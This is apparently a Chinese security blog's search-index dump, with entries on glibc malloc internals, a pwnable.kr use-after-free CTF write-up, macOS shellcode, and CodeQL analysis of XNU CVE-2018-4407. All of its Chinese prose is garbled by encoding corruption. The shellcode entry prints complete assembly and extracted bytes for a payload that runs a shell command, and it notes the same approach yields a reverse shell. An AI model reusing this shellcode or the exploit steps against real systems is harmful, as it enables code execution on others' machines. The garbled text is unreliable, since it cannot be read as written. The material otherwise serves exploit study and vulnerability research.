nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } â€‹ é¦–å…ˆï¼Œè·å–åˆ°top chunkï¼Œç„¶åè·å–top chunkçš„sizeï¼Œæ¥ç€åˆ¤æ–­sizeå’Œè¦åˆ†é…çš„å¤§å°nbï¼Œå¦‚æœsizeå¤§äºæˆ‘ä»¬è¦åˆ†é…çš„å¤§å°nbï¼Œé‚£å°±ç›´æ¥ä»top chunkä¸­åˆ†å‰²ï¼Œçš„åˆ°victimï¼Œåˆ†å‰²å‰©ä½™éƒ¨åˆ†ä½œä¸ºæ–°çš„top chunkï¼Œè®¾ç½®victimçš„ä¸€äº›æ ‡å¿—ä½ä¹‹åï¼Œè°ƒç”¨chunk2mem()çš„åˆ°å¯ç”¨å†…å­˜æŒ‡é’ˆå¹¶ä¸”è¿”å›ç»™ç”¨æˆ·ã€‚ â€‹ ä¸€ç‚¹å°ç»†èŠ‚ï¼Œå› ä¸ºtop chunkéœ€è¦MINSIZE çš„ç©ºé—´æ¥ä½œä¸ºfencepostï¼Œæ‰€ä»¥å¤§å°æ¯”è¾ƒçš„æ—¶å€™è¦åŠ ä¸ªMINSIZEï¼›æ‰€ä»¥åœ¨åˆ†å‰²å®Œæˆä¹‹åå¹¶ä¸ç”¨å»è®¾ç½®footã€‚ 1234567891011/* When we are using atomic ops to free fast chunks we can get here for all block sizes. */else if (have_fastchunks (av)) { malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); } â€‹ å¦‚æœè¿˜æ˜¯æ²¡ä»top chunkä¸­åˆ†é…åˆ°ï¼Œåˆ¤æ–­å½“å‰åˆ†é…åŒºä¸­æ˜¯å¦æœ‰fast binsä¸­æ˜¯å¦æœ‰chunkï¼Œæœ‰çš„è¯å°±åˆå¹¶åˆ°unsorted binä¸­ï¼Œæ¥ç€åˆ¤æ–­ï¼Œåœ¨small binèŒƒå›´å†…ï¼Œå°±å†æ¬¡è®¾ç½®idxï¼Œè¿›åˆ°æœ€å¤–å±‚å¾ªç¯ï¼Œå†æ¥ä¸€æ¬¡ï¼Œç›¸å¯¹åº”çš„ï¼Œlarge binèŒƒå›´å†…ä¹Ÿæ˜¯ä¸€æ ·ï¼Œè®¾ç½®idxï¼Œå†åˆ°æœ€å¤–å±‚å¾ªç¯ã€‚ 6.sysmallocâ€‹ åœ¨ä¹‹å‰çš„åˆ†é…ç­–ç•¥éƒ½æ²¡åŠæ³•åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å­˜çš„æ—¶å€™ï¼Œå°±ä¼šèµ°åˆ°è¿™é‡Œã€‚è¿™é‡Œç›´æ¥è°ƒç”¨äº†sycmalloc()å»åˆ†é…ï¼Œå…¶å®å°±æ˜¯ä½¿ç”¨äº†mmap()ç›´æ¥æ˜ å°„ï¼Œå½“ç„¶è¿™ä¸ªå‡½æ•°ä¸å¯èƒ½è¿™ä¹ˆç®€å•ï¼Œä»–å¯¹ä¸åŒæƒ…å†µåšäº†ä¸åŒçš„å¤„ç†ã€‚ 123456789101112 /* Otherwise, relay to handle system-dependent cases */ else { void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; } }} 2. sysmalloc åˆ†æ12static void * sysmalloc (INTERNAL_SIZE_T nb, mstate av) ä¸ºäº†æ²»ç–—æ‹–å»¶ç—‡ï¼Œæ‰€ä»¥æŠŠè¿‡ç¨‹è®°å½•åœ¨åšå®¢ä¸Šï¼Œæ…¢æ…¢æ›´æ–°...","link":"/2016/11/21/Have-fun-with-glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"title":"NULL","text":"å¸Œæœ›ä¸æ˜¯å¹»è§‰ è‡ªé—­+1","link":"/2019/04/17/NULL/"},{"title":"dragon","text":"0x00:dragon æ˜¯ä¸€ä¸ªUAFæ¼æ´çš„åˆ©ç”¨ã€‚ UseAfterFree æ˜¯å †çš„æ¼æ´åˆ©ç”¨çš„ä¸€ç§ç®€å•ä»‹ç» ç®€å•çš„æ¥è¯´å°±æ˜¯ å†æ¬¡ä½¿ç”¨äº† free æ‰çš„å†…å­˜ 0x01:ç®€å•çš„çœ‹ä¸€ä¸‹è¿è¡Œèµ·æ¥çœ‹ä¸€ä¸‹ æ˜¯ä¸€ä¸ªRPGæ¸¸æˆï¼Œæœ‰ä¸¤ç§è§’è‰²ï¼Œæ¯ä¸ªè§’è‰²çš„æŠ€èƒ½ä¸ä¸€æ ·(æˆ˜å£«æ³•å¸ˆä¹‹ç±»çš„å§â€¦)åœ¨è¿›IDAåˆ†æçš„æ—¶å€™ï¼Œå‘ç°é¾™æ˜¯åˆ†ä¸¤ç§çš„ baby_dragon å’Œ mommy_dragonï¼Œä¸¤ç§çš„è¡€é‡å’Œæ”»å‡»åŠ›ä¹Ÿå„ä¸ç›¸åŒã€‚ è€Œä¸”é¾™çš„ç»“æ„ä½“æ˜¯é€šè¿‡åŠ¨æ€åˆ†é…ï¼Œå¡«å……æ•°æ®ï¼Œåœ¨é¾™æ­»äº¡ä¹‹åè¿™éƒ¨åˆ†å†…å­˜freeæ‰ï¼Œå†æ¬¡æ¸¸æˆå°±ä¼šå†åˆ†é…å†…å­˜â€¦å¦‚æ­¤å¾ªç¯æ­¤å¤–ï¼Œå‘ç°ä¸€ä¸ªç¥ç§˜å…³å¡:çœ‹ç€å¾ˆç¾å¥½ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆxç”¨ï¼Œè¯»å–å­—ç¬¦ä¸²é™å®šé•¿åº¦ï¼Œæ‰€ä»¥ä»è¿™é‡Œæ‹¿ä¸åˆ°shellçš„~ 0x02:åˆ†æè¿˜æ˜¯è¦ä»å†…å­˜åˆ†é…ä¸Šä¸‹æ‰‹ï¼Œåªæœ‰å…ˆæ‰“èµ¢dragonæ‰å¯ä»¥freeå†…å­˜ï¼Œå†æ¬¡åˆ†é…ï¼Œæ‰ä¼šæœ‰æœºä¼šç©ã€‚ å›å»çœ‹çœ‹é¾™çš„ç»“æ„ä½“:åœ¨dragonç»“æ„ä½“ä¸­ï¼Œè¡¨ç¤ºè¡€é‡çš„æ•°æ®å­˜å‚¨åœ¨ eax+8 çš„åœ°æ–¹ï¼Œè¿˜æ˜¯ 1 byte çš„å¤§å°ï¼ŒèŒƒå›´åº”è¯¥æ˜¯ 0~127é¾™ç§ç±»æœ‰ä¸¤ç§,æˆ‘ä»¬éœ€è¦å‡ºç°mama dragonï¼ˆè¡€å¤šï¼Œæ‰“çš„å°‘ï¼‰é¾™çš„è¡€é‡åœ¨å°äºé›¶çš„æ—¶å€™å°±ä¼šæ­»äº¡ï¼è¿™ç‚¹å¾ˆå…³é”®ã€‚RPGæ¸¸æˆçš„è§’è‰²æœ‰ä¸¤ä¸ªï¼Œknightå’Œpriestã€‚æ¯ä¸ªè§’è‰²æŠ€èƒ½ä¸ä¸€æ ·ã€‚priest çš„ 3 å¯ä»¥ ä½¿ç”¨mp ä½¿å¾— dragonæ”»å‡»æ— æ•ˆï¼Œè¿™æ—¶å€™dragonè¡€é‡ä¼šæ¢å¤ã€‚é‚£å°±å¯ä»¥ä½¿ç”¨priestï¼Œè€—åˆ°dragonè¡€é‡ æº¢å‡ºï¼Œä¸€æ—¦å°äºé›¶(æº¢å‡º)ï¼Œé‚£ä¹ˆdragonå°±æ­»äº†ï¼Œä¹Ÿå°±æ˜¯è®©å®ƒåŠ è¡€åŠ åˆ°æº¢å‡ºã€‚ 0x03:æ§åˆ¶æµç¨‹IDAé‡ŒæŸ¥çœ‹æµç¨‹ï¼Œåœ¨èƒœåˆ©ä¹‹åï¼Œfree() ä¹‹ååˆé‡æ–°mallocåˆ†é…äº†é¾™çš„ç»“æ„ä½“ï¼Œè¿™æ—¶å€™ åœ¨è¾“å…¥åå­—çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶4å­—èŠ‚ã€‚(call eax) 0x04:æ€ä¹ˆæ“ä½œå¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š æ•…æ„æ­»äº¡ä¸€æ¬¡ é€‰æ‹©priestè§’è‰² 332 çš„æ“ä½œ3è½® æœ€åç¨‹åºä¼šæœ‰è¾“å…¥ï¼Œè¿™æ—¶å€™å†™å…¥4å­—èŠ‚åˆ°eaxï¼Œä¹‹åç¨‹åºä¼šcall eax éªŒè¯æ¼æ´ å†™å‡ºexpæ‰“è¿œç¨‹æœåŠ¡å™¨æ‰“ä¸€å‘ä¹‹åæå®š~~ 0x05ï¼šç»“æŸè¯­ UAF æŒºæœ‰æ„æ€~ é¡ºä¾¿æŠŠpwnable.krçš„UAFé‚£ä¸ªå…³å¡ä¹Ÿç»™ç§’äº†~æŒºç®€å•çš„ å°±ä¸å†™äº†ã€‚","link":"/2015/11/05/dragon/"},{"title":"SHELLCODE on macOS","text":"shellcode on macOSæœ€è¿‘å› ä¸ºä¸€äº›å·¥ä½œä¸Šçš„éœ€æ±‚éœ€è¦æä¸‹macOSä¸Šçš„shellcdoeï¼Œè°·æ­Œäº†å¾ˆå¤šèµ„æ–™/ä»£ç åå‘ç°è¿˜æ˜¯æœ‰ä¸å°‘å‘çš„ï¼Œæˆ–è€…å°±æ˜¯ä»£ç æ¯”è¾ƒè€ï¼Œå®šåˆ¶åŒ–ç¨‹åº¦æ¯”è¾ƒé«˜ï¼Œä¸å¤ªç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œå…¶å®æˆ‘éœ€æ±‚ä¹Ÿç®€å• pop calcæˆ–è€…reverse shellï¼Œå°±æ˜¯ä¸ªæ¼”ç¤ºæ•ˆæœ ğŸ¤£ã€‚ ENVæˆ‘è¿™é‡Œç¯å¢ƒæ˜¯ macOS big sur(å¯¹ï¼Œæ²¡é”™ï¼Œå°ç™½é¼ ğŸ) å·¥å…·é“¾åŸºæœ¬éƒ½æ˜¯brewç›´æ¥è£…æˆ–è€…è‡ªå¸¦çš„ã€‚ Step1å…¶å®åœ¨macOSä¸Šå†™shellcodeå’ŒLinuxå·®ä¸å¤šï¼Œéƒ½æ˜¯è¦èµ°ç³»ç»Ÿè°ƒç”¨ï¼Œå¤§æ¦‚å°±æ˜¯å¸ƒç½®å‚æ•°ï¼Œå†™å¥½è°ƒç”¨å·ï¼Œç„¶åä¸€ä¸ªsyscallè¿›å»å³å¯ã€‚ æˆ‘è¿™é‡Œä¸ºäº†çœäº‹å„¿ï¼Œåšçš„æ˜¯æ‰§è¡Œsystem('xxxxxx')çš„shellcodeï¼Œè¿™æ ·å¯¹äºæˆ‘æ¼”ç¤ºæ¥è¯´ï¼Œä¸ç®¡æ˜¯å¼¹è®¡ç®—å™¨è¿˜æ˜¯åå¼¹shelléƒ½æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæ˜¯å®æˆ˜å•¥çš„ï¼Œå»ºè®®å‚è€ƒå¾ˆæ—©ä¹‹å‰hacking teamæ³„æ¼é‚£ç§ç©æ³•ï¼Œä¸è¿‡æ ¸å¿ƒåŸç†éƒ½æ˜¯é‚£æ ·ï¼Œä¸è¿‡äººå®¶ç©çš„æ¯”è¾ƒé«˜çº§(æ¯•ç«Ÿå†›ç«å˜›)ã€‚ exec_calc.asm: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253BITS 64global startsection .textstart: xor rax, rax mov rax,0x2 ror rax, 0x28 or rax, 59 mov rcx, rax xor rdx, rdx mov rbx, 0x68732f2f6e69622f push rdx push rbx push rsp pop rdi push rdx mov rbx, 0x632d push rdx push rbx push rsp pop rbx push rdx ; å‚æ•°å¼€å§‹ mov rcx, 0x7070612e726f7461 push rcx mov rcx, 0x6c75636c61432f73 push rcx mov rcx, 0x6e6f69746163696c push rcx mov rcx, 0x7070412f6d657473 push rcx mov rcx, 0x79532f206e65706f push rcx ; å‚æ•°ç»“æŸ push rsp pop rcx push rdx push rcx push rbx push rdi push rsp pop rsi syscall Step2å…¶å®æ ¸å¿ƒçš„å°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œå³å­—ç¬¦ä¸²æ€ä¹ˆæ„é€ è¿›å»ï¼Œè¿™é‡Œæ˜¯éƒ½å‹åˆ°æ ˆé‡Œç„¶åä¼ é€’ä¸ªæŒ‡é’ˆï¼Œå¸¸è§„æ“ä½œã€‚ 123$ nasm -f macho64 -o exec_calc.o exec_calc.asm$ ld -macosx_version_min 10.7.0 -o exec_calc exec_calc.old: warning: building for macOS 10.7.0 is deprecated ç„¶åä»objdumpçš„ç»“æœä¸­æå–å­—èŠ‚ç å³å¯ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445$ objdump -d ./exec_calc.o./exec_calc.o: file format Mach-O 64-bit x86-64Disassembly of section __TEXT,__text:0000000000000000 start: 0: 48 31 c0 xorq %rax, %rax 3: b8 02 00 00 00 movl $2, %eax 8: 48 c1 c8 28 rorq $40, %rax c: 48 83 c8 3b orq $59, %rax 10: 48 89 c1 movq %rax, %rcx 13: 48 31 d2 xorq %rdx, %rdx 16: 48 bb 2f 62 69 6e 2f 2f 73 68 movabsq $7526411283028599343, %rbx 20: 52 pushq %rdx 21: 53 pushq %rbx 22: 54 pushq %rsp 23: 5f popq %rdi 24: 52 pushq %rdx 25: bb 2d 63 00 00 movl $25389, %ebx 2a: 52 pushq %rdx 2b: 53 pushq %rbx 2c: 54 pushq %rsp 2d: 5b popq %rbx 2e: 52 pushq %rdx 2f: 48 b9 61 74 6f 72 2e 61 70 70 movabsq $8102082581755819105, %rcx 39: 51 pushq %rcx 3a: 48 b9 73 2f 43 61 6c 63 75 6c movabsq $7815262045510774643, %rcx 44: 51 pushq %rcx 45: 48 b9 6c 69 63 61 74 69 6f 6e movabsq $7957695015157983596, %rcx 4f: 51 pushq %rcx 50: 48 b9 73 74 65 6d 2f 41 70 70 movabsq $8102047401594156147, %rcx 5a: 51 pushq %rcx 5b: 48 b9 6f 70 65 6e 20 2f 53 79 movabsq $8742383117993865327, %rcx 65: 51 pushq %rcx 66: 54 pushq %rsp 67: 59 popq %rcx 68: 52 pushq %rdx 69: 51 pushq %rcx 6a: 53 pushq %rbx 6b: 57 pushq %rdi 6c: 54 pushq %rsp 6d: 5e popq %rsi 6e: 0f 05 syscall è¿™ä¸€æ­¥è§ä»è§æ™ºäº†ï¼Œæœ‰å¤§ä½¬ç”¨bashä¸€è¡Œæå®šï¼Œè€Œæˆ‘æ¯”è¾ƒèœï¼Œä¹‹å‰æ˜¯å†™äº†ä¸ªpyè„šæœ¬æå–ç„¶åæ ¼å¼åŒ–è¾“å‡ºçš„ã€‚ ä¹‹å‰çœ‹åˆ°è¿‡ä¸€ä¸ªLinuxç‰ˆæœ¬çš„ä¸€é”®æå–ï¼Œä¸è¿‡æ„Ÿè§‰å¤ªå¤æ‚äº†â€¦ 1objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g' æœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥æä¸ªmacOSç‰ˆæœ¬ğŸ¤£ å‚è€ƒshellcode-osx","link":"/2020/11/28/shell-code-on-macos/"},{"title":"CodeQL + XNU From 0 to 1","text":"Basicæœ¬æ–‡å±äºå­¦ä¹ è¿‡ç¨‹ä¸­çš„ç¬”è®°ï¼ŒåŸºæœ¬ä¸Šæ˜¯æŠŠç°æœ‰çš„ç›¸å…³èµ„æ–™æ•´åˆåˆ°ä¸€èµ·ï¼Œé˜…è¯»å·²æœ‰åšå®¢/æ–‡ç« å¹¶å¤ç°ï¼ŒåŠ å…¥ä¸€äº›è‡ªå·±çš„æƒ³æ³•åè®°å½•ä¸‹æ¥çš„äº§ç‰©ã€‚ build XNU è¿‡ç¨‹æ¥è‡ªæŸå¤§ä½¬çš„åšå®¢ï¼Œbuild xnu with codeqlè¿‡ç¨‹æ¥è‡ªgithub UPDATE 2021.3.7 æ›´æ–°ï¼Œæˆ‘åœ¨big surä¸Šbuild xnu-7195.81.3 ä¹Ÿæ˜¯é‡åˆ°äº†pythonæƒé™çš„é—®é¢˜ï¼Œä½¿ç”¨virtualenvçš„æ–¹å¼è§£å†³äº†ã€‚ å¦‚æœæ˜¯è€ç‰ˆæœ¬ï¼Œå»ºè®®å…ˆæœä¸€ä¸‹æœ‰æ²¡æœ‰ç°æˆçš„databaseå¯ä»¥ç”¨ã€‚ å¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯¹äºç‰ˆæœ¬è·¨åº¦æ¯”è¾ƒå¤§çš„æƒ…å†µï¼Œè¿˜æ˜¯è™šæ‹Ÿæœº+è€ç‰ˆæœ¬Xcodeæ¯”è¾ƒç¨³ã€‚ Building XNU for macOS Big Sur 11.0.1 (Intel) D4rkD0g/boringforever 12curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudepsmake -f Makefile.xnudeps 12345678910111213141516171819202122--------------------------------------------------------------------------------XNU is now ready to build!To build the kernel for supported x86_64 machines:cd xnu-7195.81.3make SDKROOT=macosx TARGET_CONFIGS=\"RELEASE X86_64 NONE\"To build for supported arm64e machines you can, e.g.:cd xnu-7195.81.3make SDKROOT=macosx KDKROOT=/path/to/KDK TARGET_CONFIGS=\"RELEASE ARM64 T8101\"For a table of supported arm64 products, visit:https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html#xnu-arm64eSee xnu's top-level README file for additional build and configuration variableswhich can be passed on the command line, e.g., Speed up the build with: BUILD_LTO=0 Build the development kernel with: KERNEL_CONFIGS=DEVELOPMENTUse LOGCOLORS=y to colorize the outputUse CONCISE=y to keep all the build output on a single line-------------------------------------------------------------------------------- 12345cd xnu-7195.81.3// æ­£å¸¸ç¼–è¯‘xnuçš„å‘½ä»¤make SDKROOT=macosx TARGET_CONFIGS=\"RELEASE X86_64 NONE\"// ä½¿ç”¨codeqlç¼–è¯‘å‘½ä»¤codeql database create xnu-database --language=cpp --command=\"make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE\" å‰©ä¸‹çš„å°±æ˜¯ç­‰äº†: éšåå¯ä»¥å¯¼å…¥æ•°æ®åº“åˆ°vscodeä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨codecli é‡åˆ°çš„é—®é¢˜1 ï¼š env: python : Permisson denied è§£å†³ï¼šå¯ä»¥å°è¯•æ›´æ¢xcodeç‰ˆæœ¬æ¥å°è¯•ï¼Œæˆ‘ä¹Ÿè¯•è¿‡ä½¿ç”¨rootæˆ–è€…ä½¿ç”¨python virtualenvæ¥è§„é¿é—®é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸è¡Œã€‚ Queryæµ‹è¯• Case studyCVE-2018-4407 - ping ping pingSetup envKernel crash caused by out-of-bounds write in Appleâ€™s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab ä»¥10.13.6ä¸ºä¾‹ éœ€è¦ä½ç‰ˆæœ¬çš„xcodeæ¥ç¼–è¯‘ï¼Œç›´æ¥å» https://developer.apple.com/download/more/ ä¸‹è½½å³å¯ã€‚ æ„å»º codeql database : 123// è€ç‰ˆæœ¬ xcodemake -f Makefile.xnudeps macos_version=10.13.6 xnudeps find by codeqlå¯¼å…¥ xnu 10.13.6 çš„databaseåï¼Œå…ˆçœ‹åŸä½œè€…çš„queryï¼Œå°è¯•ç†è§£ä»–çš„æ€è·¯ 123456789101112131415161718192021222324252627282930/** * @name mbuf copydata with tainted size * @description Calling m_copydata with an untrusted size argument * could cause a buffer overflow. * @kind path-problem * @problem.severity warning * @id apple-xnu/cpp/mbuf-copydata-with-tainted-size */import cppimport semmle.code.cpp.dataflow.TaintTrackingimport DataFlow::PathGraphclass Config extends TaintTracking::Configuration { Config() { this = \"tcphdr_flow\" } override predicate isSource(DataFlow::Node source) { source.asExpr().(FunctionCall).getTarget().getName() = \"m_mtod\" } override predicate isSink(DataFlow::Node sink) { exists (FunctionCall call | call.getArgument(2) = sink.asExpr() and call.getTarget().getName().matches(\"%copydata\")) }}from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sinkwhere cfg.hasFlowPath(source, sink)select sink, source, sink, \"m_copydata with tainted size.\" åŸä½œè€…ä½¿ç”¨äº†æ±¡ç‚¹åˆ†ææ¥è¿½è¸ªm_mtodè°ƒç”¨åˆ° copydata é•¿åº¦å‚æ•°ã€‚ è¯´ä¸‹å…·ä½“çš„source sinkçš„æè¿°æŠŠï¼š source ï¼š æ•°æ®æµèµ·ç‚¹ï¼Œæ˜¯ä¸€ä¸ª å‡½æ•°è°ƒç”¨(functioncall)ï¼Œå¹¶ä¸”è¯¥å‡½æ•°æ˜¯ m_mtod sink : â€œç»ˆç‚¹â€ï¼ˆå¯ä»¥è¿™ä¹ˆç†è§£å§ï¼‰ï¼Œæ˜¯ copydata å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‡½æ•°ååŒ¹é…ä½¿ç”¨äº†æ­£åˆ™ï¼Œèƒ½åŒ¹é…åˆ° copydata ç³»åˆ—ã€‚ ç»“æœå¦‚ä¸‹ï¼š æˆ‘è®¤ä¸ºéš¾ç‚¹å¹¶ä¸æ˜¯å¦‚ä½•å†™æ±¡ç‚¹åˆ†æçš„queryï¼Œéš¾ç‚¹åº”è¯¥æ˜¯ åˆ†æå°±ç»“æœç„¶åæ„é€ poc æ¼æ´åˆ†æä»è¡¨è±¡æ¥çœ‹æ¼æ´å‡ºåœ¨ m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip); ip_icmp.c - apple/darwin-xnu - Sourcegraph çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªcopyæ•°æ®çš„æ—¶å€™æ²¡æœ‰å¯¹è¾¹ç•Œè¿›è¡Œæ£€æŸ¥çš„â€œç®€å•çš„â€œæ¼æ´ï¼Œä½†æ˜¯Ian beerç»™ä½œè€…é‚®ä»¶è§£é‡Šäº†root casueï¼Œè¿™ä¸ªæ¼æ´å‘ç”Ÿçš„æœ¬è´¨åŸå› å¹¶ä¸æ˜¯è¿™ä¸ªåœ°æ–¹ã€‚ é¦–å…ˆçœ‹å‡ºç°æ¼æ´çš„å‡½æ•°ä¿¡æ¯ï¼š 1234567891011121314/* * Generate an error packet of type error * in response to bad packet ip. */voidicmp_error( struct mbuf *n, int type, int code, u_int32_t dest, u_int32_t nextmtu){...} è¿™ä¸ªå‡½æ•°æ˜¯å¤„ç†â€œæœ‰é—®é¢˜çš„IPåŒ…â€çš„ï¼Œè¿”å›ä¸€ä¸ªâ€œerror packetâ€ç»™å‘é€è€…ï¼Œç›¸å½“äºï¼šå‘ç°å‘è¿‡æ¥çš„IPåŒ…æœ‰é—®é¢˜ä¹‹åï¼Œç”Ÿæˆä¸€ä¸ªé”™è¯¯ä¿¡æ¯è¿”å›ç»™å‘é€è€…ã€‚ ä¸Šé¢çš„copyå‡½æ•°æ˜¯å¤åˆ¶åŸæœ¬IPåŒ…åŒ…å¤´çš„ä¿¡æ¯å¤åˆ¶åˆ°è¿”å›åŒ…ä¸­ï¼Œå‡ºç°äº†é—®é¢˜ã€‚æ ¹æ®Ian beerçš„è§£é‡Šï¼š æ¼æ´å®é™…å‘ç”Ÿåœ¨æ›´æ—©çš„åœ°æ–¹ï¼š 1icp-&gt;icmp_type = type; é‚£ä¹ˆå°±è¦æŠŠè¿™ä¸ªå‡½æ•°ä»å¤´å¼€å§‹åˆ†æä¸€ä¸‹äº†ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ï¼šæœ‰é—®é¢˜çš„æ•°æ®åŒ…åœ¨å“ªé‡Œè¿›æ¥çš„ï¼Œåœ¨å“ªé‡Œè¢«å¤„ç†çš„ï¼Œæœ€ç»ˆæ€ä¹ˆèµ°åˆ°copyçš„é€»è¾‘çš„ã€‚ æºå¤´ï¼š struct mbuf *n è¡¨ç¤ºæœ‰é—®é¢˜çš„æ•°æ®åŒ…ï¼ˆincoming packet)ï¼Œä¸‹é¢è´´ä¸€ä¸‹ mbuf ç»“æ„ä½“ï¼š 12345678910111213141516/* * The mbuf object */struct mbuf { struct m_hdr m_hdr; union { struct { struct pkthdr MH_pkthdr; /* M_PKTHDR set */ union { struct m_ext MH_ext; /* M_EXT set */ char MH_databuf[_MHLEN]; } MH_dat; } MH; char M_databuf[_MLEN]; /* !M_PKTHDR, !M_EXT */ } M_dat;}; è¿”å›çš„æ•°æ®åŒ…ï¼š struct mbuf *m 1234if (MHLEN &gt; (sizeof(struct ip) + ICMP_MINLEN + icmplen)) m = m_gethdr(M_DONTWAIT, MT_HEADER); /* MAC-OK */ else m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR); mçš„åˆ†é…å’Œ icmplen ç›¸å…³ï¼š 123nlen = m_length(n);...icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len)); å¤„ç†ï¼š m-&gt;m_len = icmplen + ICMP_MINLEN; è¿™é‡Œçœ‹èµ·æ¥è¿˜æ²¡æœ‰é—®é¢˜ï¼Œè®¡ç®—è¿”å›åŒ…mçš„é•¿åº¦ï¼› 1234567891011MH_ALIGN(m, m-&gt;m_len); // å®// å±•å¼€ä¹‹åï¼š/* * As above, for mbufs allocated with m_gethdr/MGETHDR * or initialized by M_COPY_PKTHDR. */#define MH_ALIGN(m, len) \\do { \\ (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (sizeof (long) - 1); \\} while (0) è¿™ä¸ªå®å¹¶æ²¡æœ‰æ£€æŸ¥ MHLEN å’Œ len çš„å¤§å°å…³ç³»ï¼Œè¿™é‡Œæ˜¯æœ‰æ•´æ•°æº¢å‡ºçš„ã€‚ åœ¨è¿™ä¸ªåœºæ™¯é‡Œï¼Œ MHLEN æ˜¯ 88ï¼Œ lenæ˜¯ mâ†’m_lenï¼Œä¹Ÿå°±æ˜¯ icmplen + ICMP_MINLEN; ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ icmplen å¤§äº80ï¼Œè¿™é‡Œå°±å¯ä»¥è§¦å‘æ•´æ•°æº¢å‡ºï¼Œ m_data æŒ‡å‘äº†å…¶ä»–ä½ç½®ã€‚ éšåä½¿ç”¨åˆ°è¿™ä¸ª å·²ç»æ•´æ•°æº¢å‡º çš„é•¿åº¦çš„åœ°æ–¹ï¼Œå¹¶ä¸æ˜¯copyçš„é€»è¾‘ï¼Œè€Œæ˜¯ï¼š 12icp = mtod(m, struct icmp *);icp-&gt;icmp_type = type; // oob write here mtod åªæ˜¯è¿”å›äº† mbuf çš„ data æŒ‡é’ˆ å®ä¸€æ­¥ä¸€æ­¥å±•å¼€ä¹‹åï¼š 123456789101112#define mtod(m, t) ((t)m_mtod(m))void *m_mtod(struct mbuf *m){ return (MTOD(m, void *));}/* * Macro version of mtod. */#define MTOD(m, t) ((t)((m)-&gt;m_data)) åœ¨ä¸Šé¢çš„è¿‡ç¨‹ä¹‹åï¼ŒicpæŒ‡é’ˆæœ¬æ¥æ˜¯æŒ‡å‘ m_bufçš„æ•°æ®éƒ¨åˆ† ä½†æ˜¯æ•´æ•°æº¢å‡ºä¹‹åï¼Œmâ†’m_data å¢åŠ äº†ä¸€ä¸ªå¾ˆå¤§çš„å€¼(&lt;4GB)ï¼Œæœ€ç»ˆåœ¨ 12icp-&gt;icmp_type = type; å°±å‘ç”Ÿäº†è¶Šè§£å†™ï¼Œroot case åˆ†æå®Œæ¯•ã€‚ about PATCHå…ˆè¯´ä¸ªäººç†è§£ï¼Œç›´æ¥å¯¹ incoming packetçš„ icmplen åšæ£€æŸ¥ï¼Œä½¿å¾—è¿™ä¸ªé•¿åº¦å¿…é¡»æ˜¯åœ¨åˆæ³•èŒƒå›´å†…ï¼ˆæ ¹æ®åŒ…ç»“æ„æ¥è®¡ç®—ï¼‰ é•¿åº¦å¿…é¡» å¤§äºç­‰äº sizeof(struct ip) + ICMP_MINLEN é•¿åº¦å¿…é¡» å¤§äºç­‰äº oiphlen+ICMP_MINLEN åé¢è¦è®¡ç®— è¿”å›åŒ…é•¿åº¦çš„æ—¶å€™: æ‰€ä»¥è¿™é‡Œå–åˆ°çš„ä¸€å®šæ˜¯ä¸€ä¸ªåˆæ³•çš„å€¼ã€‚ å†çœ‹åç»­æ ¹æ®é•¿åº¦ï¼Œæ‹·è´æ•°æ®çš„é€»è¾‘ï¼š 12icmplen = min(icmplen, M_TRAILINGSPACE(m) - sizeof(struct ip) - ICMP_MINLEN); è¿™ä¸ªé•¿åº¦æ˜¯ç»è¿‡è®¡ç®—çš„ï¼ŒæŠŠä¸ºm dataéƒ¨åˆ†åˆ†é…çš„ç©ºé—´å¤§å°è€ƒè™‘äº†è¿›å»ï¼Œè¿™æ ·ä¿è¯æ‹·è´æ•°æ®çš„é•¿åº¦æ˜¯åˆæ³•çš„ã€‚ è‡³æ­¤è¿™ä¸ªæ´ç®—æ˜¯ä¿®çš„æ²¡é—®é¢˜äº†ã€‚ Apple macOS 6LowPAN VulnerabilityCVE-2020-9967 - Apple macOS 6LowPAN Vulnerability Setup envæœ‰æ¼æ´çš„ç‰ˆæœ¬ 10.15.4 ä¸ºç›®æ ‡ï¼Œè‹¹æœä¹Ÿåœ¨Big Suré‡Œåšäº†ä¿®å¤ï¼Œè¿™äº›æ´å½±å“èŒƒå›´è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œä¸ºäº†æ–¹ä¾¿èµ·è§ä½¿ç”¨ 10.15.4 ã€‚ (â‰¤ 10.15.4) Building XNU for macOS Catalina 10.15.x 